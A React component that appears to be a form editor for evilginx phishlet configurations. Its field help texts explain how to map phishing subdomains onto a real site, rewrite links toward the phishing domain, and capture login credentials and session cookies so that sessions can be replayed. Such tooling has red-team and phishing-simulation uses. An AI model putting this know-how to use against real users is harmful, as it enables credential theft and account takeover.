import React from 'react';
import Info from './Info.jsx';

function ListEditor({ items, setItems, fields, addLabel }) {
  function update(idx, key, value) {
    const next = items.slice();
    next[idx] = { ...next[idx], [key]: value };
    setItems(next);
  }
  function remove(idx) {
    setItems(items.filter((_, i) => i !== idx));
  }
  function add() {
    const blank = {};
    fields.forEach((f) => (blank[f.key] = f.default ?? ''));
    setItems([...items, blank]);
  }

  return (
    <div className="stack">
      {items.map((item, idx) => (
        <div key={idx} className="row wrap" style={{ borderBottom: '1px solid var(--border)', paddingBottom: 8 }}>
          {fields.map((f) => (
            <label key={f.key} className="stack" style={{ gap: 2 }}>
              <span className="dim" style={{ fontSize: 11 }}>{f.label}</span>
              {f.type === 'checkbox' ? (
                <input
                  type="checkbox"
                  checked={!!item[f.key]}
                  onChange={(e) => update(idx, f.key, e.target.checked)}
                />
              ) : f.type === 'list' ? (
                <input
                  value={(item[f.key] || []).join(',')}
                  onChange={(e) => update(idx, f.key, e.target.value.split(',').map((s) => s.trim()).filter(Boolean))}
                  placeholder={f.placeholder}
                />
              ) : (
                <input
                  value={item[f.key] || ''}
                  onChange={(e) => update(idx, f.key, e.target.value)}
                  placeholder={f.placeholder}
                />
              )}
            </label>
          ))}
          <button className="danger" onClick={() => remove(idx)}>Remove</button>
        </div>
      ))}
      <button onClick={add}>{addLabel}</button>
    </div>
  );
}

export default function PhishletForm({ form, setForm }) {
  const set = (key, value) => setForm({ ...form, [key]: value });

  return (
    <div className="stack">
      <div className="row wrap">
        <label className="stack" style={{ gap: 2 }}>
          <span className="dim" style={{ fontSize: 11 }}>Author</span>
          <input value={form.author} onChange={(e) => set('author', e.target.value)} />
        </label>
        <label className="stack" style={{ gap: 2 }}>
          <span className="dim" style={{ fontSize: 11 }}>Min version</span>
          <input value={form.minVer} onChange={(e) => set('minVer', e.target.value)} />
        </label>
      </div>

      <h3>Proxy hosts <Info text="Each proxy host maps a phishing subdomain to the real one being proxied. 'session' marks it as the host that carries the session cookie; 'is_landing' marks the entry page visitors first hit." /></h3>
      <ListEditor
        items={form.proxyHosts}
        setItems={(v) => set('proxyHosts', v)}
        addLabel="+ Add proxy host"
        fields={[
          { key: 'phishSub', label: 'phish_sub', placeholder: 'www' },
          { key: 'origSub', label: 'orig_sub', placeholder: 'www' },
          { key: 'domain', label: 'domain', placeholder: 'example.com' },
          { key: 'session', label: 'session', type: 'checkbox' },
          { key: 'isLanding', label: 'is_landing', type: 'checkbox' },
        ]}
      />

      <h3>Sub filters <Info text="Text substitutions applied to proxied responses — e.g. rewriting links pointing at the real domain so they point at your phishing domain instead." /></h3>
      <ListEditor
        items={form.subFilters}
        setItems={(v) => set('subFilters', v)}
        addLabel="+ Add sub filter"
        fields={[
          { key: 'triggersOn', label: 'triggers_on', placeholder: 'www.example.com' },
          { key: 'origSub', label: 'orig_sub', placeholder: 'www' },
          { key: 'domain', label: 'domain', placeholder: 'example.com' },
          { key: 'search', label: 'search', placeholder: 'href="https://' },
          { key: 'replace', label: 'replace', placeholder: 'href="https://{hostname}' },
          { key: 'mimes', label: 'mimes (csv)', type: 'list', placeholder: 'text/html,application/json' },
        ]}
      />

      <h3>Auth tokens <Info text="Which cookies/tokens to capture from the target domain once a visitor logs in — these are what let you replay their session." /></h3>
      <ListEditor
        items={form.authTokens}
        setItems={(v) => set('authTokens', v)}
        addLabel="+ Add auth token domain"
        fields={[
          { key: 'domain', label: 'domain', placeholder: '.example.com' },
          { key: 'keys', label: 'keys (csv)', type: 'list', placeholder: 'session_id' },
        ]}
      />

      <h3>Credentials <Info text="The form field names (POST body keys) evilginx should watch for and capture as the username/password." /></h3>
      <div className="row wrap">
        <label className="stack" style={{ gap: 2 }}>
          <span className="dim" style={{ fontSize: 11 }}>username key</span>
          <input
            value={form.credentials?.username?.key || ''}
            onChange={(e) =>
              set('credentials', { ...form.credentials, username: { ...form.credentials?.username, key: e.target.value } })
            }
          />
        </label>
        <label className="stack" style={{ gap: 2 }}>
          <span className="dim" style={{ fontSize: 11 }}>password key</span>
          <input
            value={form.credentials?.password?.key || ''}
            onChange={(e) =>
              set('credentials', { ...form.credentials, password: { ...form.credentials?.password, key: e.target.value } })
            }
          />
        </label>
      </div>

      <h3>Login <Info text="The real login page's hostname and path — used to detect when a visitor has reached the login form." /></h3>
      <div className="row wrap">
        <label className="stack" style={{ gap: 2 }}>
          <span className="dim" style={{ fontSize: 11 }}>login domain</span>
          <input
            value={form.login?.domain || ''}
            onChange={(e) => set('login', { ...form.login, domain: e.target.value })}
          />
        </label>
        <label className="stack" style={{ gap: 2 }}>
          <span className="dim" style={{ fontSize: 11 }}>login path</span>
          <input
            value={form.login?.path || ''}
            onChange={(e) => set('login', { ...form.login, path: e.target.value })}
          />
        </label>
      </div>
    </div>
  );
}
